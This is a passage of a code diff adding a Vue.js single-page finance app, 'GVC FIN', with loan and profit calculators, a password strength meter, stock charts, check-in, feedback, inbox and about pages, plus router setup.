+                });
+                const addEvent = () => {
+                    if (cal.event && cal.date) {
+                        cal.list.push({ event: cal.event, date: cal.date });
+                        cal.event = '';
+                    }
+                };
+
+                // Loan State
+                const loan = reactive({ amount: 100000, rate: 5.5, months: 36 });
+                const loanMonthlyPayment = computed(() => {
+                    if (!loan.rate || !loan.months) return 0;
+                    const r = loan.rate / 100 / 12;
+                    const n = loan.months;
+                    return (loan.amount * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                });
+                const loanTotalInterest = computed(() => (loanMonthlyPayment.value * loan.months) - loan.amount);
+
+                // Profit State
+                const profitData = reactive({ cost: 20, price: 50, qty: 150 });
+                const calculatedProfit = computed(() => (profitData.price - profitData.cost) * profitData.qty);
+
+                // Reverse Yield State
+                const rev = reactive({ principal: 10000, target: 15000, years: 3 });
+                const requiredCagr = computed(() => {
+                    if (rev.principal <= 0 || rev.years <= 0) return 0;
+                    return (Math.pow(rev.target / rev.principal, 1 / rev.years) - 1) * 100;
+                });
+
+                // Password & MD5 State (Demonstrating required md5 usage)
+                const pwd = reactive({ input: 'GVC_Secure_2026!' });
+                const pwdMd5 = computed(() => md5(pwd.input));
+                const pwdRating = computed(() => {
+                    const len = pwd.input.length;
+                    if (len < 6) return 'WEAK';
+                    if (len < 10) return 'MODERATE';
+                    return 'HIGH SECURITY';
+                });
+                const pwdRatingColor = computed(() => {
+                    if (pwd.input.length < 6) return 'text-rose-400';
+                    if (pwd.input.length < 10) return 'text-warning-neon';
+                    return 'text-emerald-400';
+                });
+
+                // Credit Memo State
+                const credit = reactive({
+                    name: 'Acme Corp Advance',
+                    amount: 2500,
+                    due: '2026-11-15',
+                    list: [
+                        { name: 'Global Tech Net', amount: 1200, due: '2026-11-05' }
+                    ]
+                });
+                const addCredit = () => {
+                    if (credit.name && credit.amount) {
+                        credit.list.push({ name: credit.name, amount: credit.amount, due: credit.due });
+                        credit.name = '';
+                        credit.amount = null;
+                    }
+                };
+
+                return {
+                    activeTool, tools,
+                    dca, dcaProfit, dcaRoi,
+                    cal, addEvent,
+                    loan, loanMonthlyPayment, loanTotalInterest,
+                    profitData, calculatedProfit,
+                    rev, requiredCagr,
+                    pwd, pwdMd5, pwdRating, pwdRatingColor,
+                    credit, addCredit
+                };
+            }
+        };
+
+        // ----------------------------------------------------
+        // 4. Settings Component
+        // ----------------------------------------------------
+        const SettingsPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4 pb-20">
+                    <div class="py-4 border-b border-cyan-500/20 mb-6">
+                        <h1 class="text-lg font-black tracking-wider text-white">SETTINGS</h1>
+                        <p class="text-[10px] text-cyan-400 tracking-widest uppercase">System Preferences & Profile</p>
+                    </div>
+
+                    <div class="flex flex-col gap-3">
+                        <div @click="$router.push('/checkin')" class="cyber-card p-4 rounded-xl flex items-center justify-between cursor-pointer hover:border-cyan-400">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold">📅</div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">Monthly Check-in</div>
+                                    <div class="text-[10px] text-slate-400">Daily attendance rewards</div>
+                                </div>
+                            </div>
+                            <span class="text-cyan-400">&gt;</span>
+                        </div>
+
+                        <div @click="$router.push('/inbox')" class="cyber-card p-4 rounded-xl flex items-center justify-between cursor-pointer hover:border-cyan-400">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold">✉</div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">Inbox</div>
+                                    <div class="text-[10px] text-slate-400">System notices & messages</div>
+                                </div>
+                            </div>
+                            <span class="text-cyan-400">&gt;</span>
+                        </div>
+
+                        <div @click="$router.push('/feedback')" class="cyber-card p-4 rounded-xl flex items-center justify-between cursor-pointer hover:border-cyan-400">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold">💬</div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">Feedback</div>
+                                    <div class="text-[10px] text-slate-400">Send support ticket</div>
+                                </div>
+                            </div>
+                            <span class="text-cyan-400">&gt;</span>
+                        </div>
+
+                        <div @click="$router.push('/about')" class="cyber-card p-4 rounded-xl flex items-center justify-between cursor-pointer hover:border-cyan-400">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold">🛡</div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">About Team & Privacy</div>
+                                    <div class="text-[10px] text-slate-400">Terms, Privacy & Developer Info</div>
+                                </div>
+                            </div>
+                            <span class="text-cyan-400">&gt;</span>
+                        </div>
+
+                        <a href="mailto:a.a.a6@gmail.com" class="cyber-card p-4 rounded-xl flex items-center justify-between cursor-pointer hover:border-cyan-400">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-8 h-8 rounded bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold">📧</div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">Contact Us</div>
+                                    <div class="text-[10px] text-slate-400">a.a.a6@gmail.com</div>
+                                </div>
+                            </div>
+                            <span class="text-cyan-400">&gt;</span>
+                        </a>
+                    </div>
+
+                    <div class="mt-8 text-center">
+                        <div class="text-xs text-slate-500 font-mono">GVC FIN v2.6.4 (Build 2026)</div>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        // ----------------------------------------------------
+        // 5. Sub-pages & Detail Components (No Tab Bar)
+        // ----------------------------------------------------
+
+        // Stock Detail Page with Dynamic SVG Price Chart
+        const StockDetailPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">{{ stock.symbol }} Detail</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="cyber-card p-4 rounded-xl mb-4">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <h2 class="text-xl font-bold text-white">{{ stock.symbol }}</h2>
+                                <p class="text-xs text-slate-400">{{ stock.name }}</p>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-xl font-mono font-bold text-white">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change >= 0 ? 'text-emerald-400' : 'text-rose-400'" class="text-xs font-mono font-bold">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- SVG Price Chart (Dynamic min/max scaling) -->
+                    <div class="cyber-card p-4 rounded-xl flex flex-col gap-3">
+                        <h3 class="text-xs font-bold text-cyan-400 uppercase">30-Day Price Trend</h3>
+                        <div class="w-full h-48 bg-black/40 rounded-lg p-2 relative flex items-center justify-center border border-cyan-500/20">
+                            <svg v-if="points.length" class="w-full h-full overflow-visible" viewBox="0 0 300 150" preserveAspectRatio="none">
+                                <!-- Grid Lines -->
+                                <line x1="0" y1="30" x2="300" y2="30" stroke="#00ffff22" stroke-width="1" />
+                                <line x1="0" y1="75" x2="300" y2="75" stroke="#00ffff22" stroke-width="1" />
+                                <line x1="0" y1="120" x2="300" y2="120" stroke="#00ffff22" stroke-width="1" />
+                                <!-- Trend Path -->
+                                <polyline :points="pointsString" fill="none" stroke="#00ffff" stroke-width="2" />
+                            </svg>
+                        </div>
+                        <div class="flex justify-between text-[10px] text-slate-400 font-mono">
+                            <span>Min: $\{{ minPrice }}</span>
+                            <span>Max: $\{{ maxPrice }}</span>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const symbol = route.query.symbol || 'AAPL';
+                const stock = computed(() => globalStocks.find(s => s.symbol === symbol) || globalStocks[0]);
+
+                const history = computed(() => stock.value.history);
+                const minPrice = computed(() => Math.min(...history.value));
+                const maxPrice = computed(() => Math.max(...history.value));
+
+                const pointsString = computed(() => {
+                    const min = minPrice.value;
+                    const max = maxPrice.value;
+                    const range = max - min || 1;
+                    const len = history.value.length;
+                    return history.value.map((val, idx) => {
+                        const x = (idx / (len - 1)) * 280 + 10;
+                        const y = 140 - ((val - min) / range) * 120 - 10;
+                        return `${x},${y}`;
+                    }).join(' ');
+                });
+
+                return { stock, history, minPrice, maxPrice, pointsString };
+            }
+        };
+
+        // Sub List Page (Rankings)
+        const SubListPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">{{ title }}</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="flex flex-col gap-2.5">
+                        <div v-for="stock in items" :key="stock.symbol" class="cyber-card p-3 rounded-lg flex items-center justify-between">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-9 h-9 rounded bg-black/40 border border-cyan-500/20 flex items-center justify-center font-mono font-bold text-xs text-cyan-300">
+                                    {{ stock.symbol }}
+                                </div>
+                                <div>
+                                    <div class="text-sm font-bold text-white">{{ stock.symbol }}</div>
+                                    <div class="text-[10px] text-slate-400">{{ stock.name }}</div>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-sm font-mono font-bold text-white">$\{{ stock.price.toFixed(2) }}</div>
+                                <div :class="stock.change >= 0 ? 'text-emerald-400' : 'text-rose-400'" class="text-[11px] font-mono font-semibold">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const title = route.query.title || 'Market Ranking';
+                const count = parseInt(route.query.count) || 10;
+
+                const items = computed(() => {
+                    return [...globalStocks].sort(() => 0.5 - Math.random()).slice(0, count);
+                });
+
+                return { title, items };
+            }
+        };
+
+        // Article / Guide Page
+        const ArticlePage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">Financial Guide</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="cyber-card p-5 rounded-xl flex flex-col gap-4 text-xs leading-relaxed text-slate-300">
+                        <h2 class="text-base font-bold text-cyan-400">Advanced Algorithmic Asset Allocation in Modern Markets</h2>
+                        <p>Navigating today's macroeconomic landscape requires robust quantitative models and strict risk boundaries. Automated dollar-cost averaging combined with dynamic rebalancing minimizes volatility impact while capturing secular growth trends.</p>
+                        <p>Key risk management principles include diversification across uncorrelated sectors, setting strict stop-loss parameters, and maintaining an adequate liquidity buffer for unforeseen market corrections.</p>
+                        <div class="p-3 bg-black/50 border border-cyan-500/30 rounded-lg text-cyan-300 font-mono">
+                            "Discipline and systematic execution remain the core pillars of sustainable portfolio growth."
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        // Monthly Check-in Page
+        const CheckinPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">Monthly Check-in</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="cyber-card p-4 rounded-xl flex flex-col items-center text-center gap-4">
+                        <div class="text-cyan-400 font-bold text-sm uppercase tracking-wider">October 2026 Attendance</div>
+                        <div class="grid grid-cols-7 gap-2 w-full">
+                            <div v-for="day in 31" :key="day" :class="checkedDays.includes(day) ? 'bg-cyan-500 text-black font-bold' : 'bg-black/40 text-slate-400'" class="h-10 rounded-lg flex items-center justify-center text-xs font-mono border border-cyan-500/20">
+                                {{ day }}
+                            </div>
+                        </div>
+                        <button @click="doCheckin" :disabled="checkedToday" class="cyber-button w-full py-3 rounded-xl text-xs font-bold uppercase tracking-wider mt-2">
+                            {{ checkedToday ? 'Checked In Today' : 'Check In Now' }}
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const checkedDays = ref([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
+                const checkedToday = ref(false);
+
+                const doCheckin = () => {
+                    const today = new Date().getDate();
+                    if (!checkedDays.value.includes(today)) {
+                        checkedDays.value.push(today);
+                    }
+                    checkedToday.value = true;
+                };
+
+                return { checkedDays, checkedToday, doCheckin };
+            }
+        };
+
+        // Feedback Page
+        const FeedbackPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">Support Feedback</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="cyber-card p-4 rounded-xl flex flex-col gap-4">
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Subject Title</label>
+                            <input type="text" v-model="title" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="Brief subject...">
+                        </div>
+                        <div>
+                            <label class="text-[10px] text-slate-400 uppercase">Message Content</label>
+                            <textarea v-model="content" rows="4" class="cyber-input w-full p-2.5 rounded-lg text-sm mt-1" placeholder="Describe your inquiry or issue..."></textarea>
+                        </div>
+                        <button @click="submitFeedback" :disabled="!isValid" :class="isValid ? 'cyber-button' : 'opacity-40 cursor-not-allowed border border-slate-700 bg-slate-900 text-slate-500'" class="w-full py-3 rounded-xl text-xs font-bold uppercase tracking-wider transition-all">
+                            Send Ticket
+                        </button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const title = ref('');
+                const content = ref('');
+
+                const isValid = computed(() => title.value.trim().length > 0 && content.value.trim().length > 0);
+
+                const submitFeedback = () => {
+                    if (!isValid.value) return;
+                    alert('Feedback sent successfully.');
+                    title.value = '';
+                    content.value = '';
+                    router.back();
+                };
+
+                return { title, content, isValid, submitFeedback };
+            }
+        };
+
+        // Inbox Page
+        const InboxPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">Inbox Notices</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="flex flex-col gap-3">
+                        <div @click="selectedMsg = msg" v-for="msg in messages" :key="msg.id" class="cyber-card p-4 rounded-xl cursor-pointer hover:border-cyan-400">
+                            <div class="flex justify-between items-center mb-1">
+                                <h3 class="text-sm font-bold text-white">{{ msg.title }}</h3>
+                                <span class="text-[10px] text-cyan-400 font-mono">{{ msg.date }}</span>
+                            </div>
+                            <p class="text-xs text-slate-400 truncate">{{ msg.content }}</p>
+                        </div>
+                    </div>
+
+                    <!-- Message Popup Modal -->
+                    <div v-if="selectedMsg" class="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+                        <div class="cyber-card p-5 rounded-xl max-w-sm w-full flex flex-col gap-4">
+                            <h3 class="text-base font-bold text-cyan-400">{{ selectedMsg.title }}</h3>
+                            <p class="text-xs text-slate-300 leading-relaxed">{{ selectedMsg.content }}</p>
+                            <button @click="selectedMsg = null" class="cyber-button py-2.5 rounded-lg text-xs font-bold uppercase">Close</button>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const messages = ref([
+                    { id: 1, title: 'Welcome to GVC FIN', date: '2026-10-22', content: 'Welcome to GVC FIN. Your terminal is successfully initialized with encrypted local security protocols.' }
+                ]);
+                const selectedMsg = ref(null);
+                return { messages, selectedMsg };
+            }
+        };
+
+        // About & Terms Page
+        const AboutPage = {
+            template: `
+                <div class="flex-1 flex flex-col p-4">
+                    <div class="flex items-center justify-between py-4 border-b border-cyan-500/20 mb-6">
+                        <button @click="$router.back()" class="cyber-button px-3 py-1.5 rounded-lg text-xs font-bold">&larr; Back</button>
+                        <h1 class="text-sm font-black tracking-wider text-white">About & Legal</h1>
+                        <div class="w-12"></div>
+                    </div>
+
+                    <div class="flex flex-col gap-4 text-xs leading-relaxed text-slate-300">
+                        <div class="cyber-card p-4 rounded-xl flex flex-col gap-2">
+                            <h2 class="font-bold text-cyan-400 uppercase">About Team</h2>
+                            <p>Developed by GVC Core Engineering. Specializing in high-performance decentralized financial terminals and secure Webview architecture.</p>
+                        </div>
+                        <div class="cyber-card p-4 rounded-xl flex flex-col gap-2">
+                            <h2 class="font-bold text-cyan-400 uppercase">Privacy Policy</h2>
+                            <p>All local calculations and cache persist securely on your device. No unauthorized telemetry or external personal data harvesting is performed.</p>
+                        </div>
+                        <div class="cyber-card p-4 rounded-xl flex flex-col gap-2">
+                            <h2 class="font-bold text-cyan-400 uppercase">Terms of Service</h2>
+                            <p>Provided for informational and utility calculation purposes. Users retain full responsibility for their financial and trading decisions.</p>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() { return {}; }
+        };
+
+        // ----------------------------------------------------
+        // Vue Router & App Initialization
+        // ----------------------------------------------------
+        const routes = [
+            { path: '/', component: LoadingPage },
+            { path: '/home', name: 'Home', component: HomePage },
+            { path: '/toolbox', name: 'Toolbox', component: ToolboxPage },
+            { path: '/settings', name: 'Settings', component: SettingsPage },
+            { path: '/stock-detail', name: 'StockDetail', component: StockDetailPage },
+            { path: '/sub-list', name: 'SubList', component: SubListPage },
+            { path: '/article', name: 'Article', component: ArticlePage },
+            { path: '/checkin', name: 'Checkin', component: CheckinPage },
+            { path: '/feedback', name: 'Feedback', component: FeedbackPage },
+            { path: '/inbox', name: 'Inbox', component: InboxPage },
+            { path: '/about', name: 'About', component: AboutPage }
+        ];
+
+        const router = createRouter({
+            history: createWebHashHistory(),
+            routes
+        });
+
+        const App = {
+            setup() {
+                const route = useRoute();
+                // Bottom tab bar only shown on main views
+                const showTabBar = computed(() => ['/home', '/toolbox', '/settings'].includes(route.path));
+                return { showTabBar };
+            }
+        };
+
+        const app = createApp(App);
+        app.use(router);
+        app.mount('#app');
+    </script>
+</body>
+</html>
